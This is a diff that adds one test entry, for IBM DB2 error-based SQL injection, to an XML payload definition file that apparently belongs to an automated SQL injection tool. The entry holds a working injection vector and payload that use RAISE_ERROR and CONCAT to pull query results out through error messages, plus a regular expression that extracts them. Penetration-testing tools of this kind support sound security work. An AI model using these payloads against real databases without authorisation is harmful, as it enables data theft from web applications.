@@ -1321,4 +1321,22 @@
         </details>
     </test>
     <!-- End of error-based tests - stacking -->
+    <test>
+        <title>IBM DB2 - Error Based </title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1,2,3</where>
+        <vector>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN RAISE_ERROR('70001',CONCAT('[DELIMITER_START]',CONCAT(([QUERY]),'[DELIMITER_STOP]'))) ELSE 1 END FROM SYSIBM.SYSDUMMY1)</vector>
+        <request>
+            <payload>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN RAISE_ERROR('70001',CONCAT('[DELIMITER_START]',CONCAT((SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE 2 END FROM SYSIBM.SYSDUMMY1),'[DELIMITER_STOP]'))) ELSE 1 END FROM SYSIBM.SYSDUMMY1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
 </root>
